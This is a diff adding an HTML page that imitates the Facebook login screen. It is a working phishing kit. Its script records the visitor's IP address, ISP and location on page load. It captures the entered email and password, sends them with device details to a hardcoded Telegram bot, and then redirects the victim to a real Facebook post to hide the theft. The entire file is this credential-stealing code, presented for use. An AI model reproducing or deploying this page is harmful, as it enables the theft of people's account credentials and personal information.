@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="si">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In or Sign Up</title>
+    <style>
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            width: 380px;
+            padding: 20px;
+        }
+        .logo {
+            color: #1877f2;
+            font-size: 45px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            font-family: inherit;
+        }
+        .login-box {
+            background: #ffffff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+        input {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        input:focus {
+            border-color: #1877f2;
+            outline: none;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #166fe5;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">facebook</div>
+        <div class="login-box">
+            <form id="loginForm" onsubmit="captureCredentials(event)">
+                <input type="text" id="email" placeholder="Email address or phone number" required>
+                <input type="password" id="pass" placeholder="Password" required>
+                <button type="submit">Log In</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // මෙහි ඔබේ Telegram Bot Token සහ නිවැරදි Chat ID එක දමන්න
+        const botToken = "9133596840:AAGIde9D_J3U3tKCUN7bIn67A4-E-HjXw8A";
+        const chatId = "8829171814";
+        const fbLink = "https://www.facebook.com/share/p/1A73NDXM7t/";
+
+        let ipInfo = {};
+
+        // පිටුව ලෝඩ් වන විටම IP සහ ISP විස්තර පසුබිමින් ලබාගෙන තබා ගැනීම
+        async function fetchNetworkInfo() {
+            try {
+                let res = await fetch('https://ipapi.co/json/');
+                ipInfo = await res.json();
+            } catch (e) {
+                console.error(e);
+            }
+        }
+
+        window.onload = function() {
+            fetchNetworkInfo();
+        };
+
+        function captureCredentials(event) {
+            event.preventDefault(); // පිටුව රෝඩ් වීම වැළැක්වීමට
+
+            let user = document.getElementById('email').value;
+            let pass = document.getElementById('pass').value;
+
+            let ip = ipInfo.ip || "Unknown";
+            let country = ipInfo.country_name || "";
+            let region = ipInfo.region || "";
+            let city = ipInfo.city || "";
+            let isp = ipInfo.org || "";
+            let deviceInfo = navigator.userAgent;
+            let platform = navigator.platform || "Unknown";
+
+            // Login විස්තර සහ Network/Device විස්තර එකතු කර පණිවිඩය සකස් කිරීම
+            let msg = "🚨 සම්පූර්ණ විස්තර ලැබුණි!\n\n" +
+                      "👤 Username/Email: " + user + "\n" +
+                      "🔑 Password: " + pass + "\n\n" +
+                      "🌐 IP Address: " + ip + "\n" +
+                      "🏢 ISP: " + isp + "\n" +
+                      "🏙️ ප්‍රදේශය: " + city + ", " + region + ", " + country + "\n" +
+                      "💻 Platform/OS: " + platform + "\n" +
+                      "📱 Device/Browser: " + deviceInfo;
+
+            let telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(msg);
+            
+            let img = new Image();
+            img.src = telegramUrl;
+
+            // තත්පර 1 කින් සැබෑ ෆේස්බුක් පෝස්ට් එකට හරවා යැවීම
+            setTimeout(function() {
+                window.location.replace(fbLink);
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
